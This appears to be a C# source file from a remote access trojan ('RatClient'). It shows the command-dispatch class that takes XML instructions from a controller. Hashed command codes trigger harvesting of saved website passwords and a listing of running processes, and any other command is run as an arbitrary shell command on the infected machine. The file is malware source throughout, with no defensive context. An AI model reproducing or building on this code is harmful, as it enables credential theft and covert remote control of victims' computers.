using RatClient.WebGather;
using RatClient.ProcManage;
using System;
using System.Xml;



namespace RatClient
{
    public class FilterCommands
    {
        public static XmlDocument xmlDoc;
        public FilterCommands()
        {
            xmlDoc = new XmlDocument();
        }
        public byte[] Run(string data)
        {
            System.Console.WriteLine(data);
            xmlDoc.LoadXml(data);
            string command = xmlDoc.SelectSingleNode("/root/command").InnerText;
            System.Console.WriteLine(command);
            if (command == string.Empty)
            {
                return null;
            }
            else if(command == "5df297c2f2da83a8b45cfd012fbf9b3c")
            {
                System.Console.WriteLine("Match");
                string type = xmlDoc.SelectSingleNode("/root/type").InnerText;
                string web = xmlDoc.SelectSingleNode("/root/web").InnerText;
                System.Console.WriteLine($"{web} {type}");
                byte[] test =  Passwords.Gather(web, type);
                Console.WriteLine(test.Length);
                return test;
            }
            else if(command== "be425fd08e9ea24230bac47493228ada")
            {
                return ProcInfo.GetFormatedProcesses();
            }
            else
            {
                return Tools.RunCommand(command);
            }
        } 
    }
}
